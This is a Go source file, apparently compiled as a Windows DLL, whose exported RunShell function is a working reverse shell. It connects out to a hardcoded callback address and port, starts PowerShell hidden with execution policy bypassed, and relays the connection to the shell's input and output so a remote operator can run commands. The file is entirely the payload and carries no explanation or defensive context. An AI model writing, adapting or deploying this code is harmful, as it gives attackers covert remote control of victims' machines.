package main

import "C"
import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"syscall"
)

//export RunShell
func RunShell() {
	addr := fmt.Sprintf("%s:%s", callbackIP, callbackPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command(
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()
	cmd.Start()

	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			io.WriteString(stdin, scanner.Text()+"\n")
		}
		stdin.Close()
	}()

	go io.Copy(conn, stdout)
	go io.Copy(conn, stderr)

	cmd.Wait()
}

const (
	callbackIP   = "10.0.0.4"
	callbackPort = "9001"
)

func main() {} // Required but unused
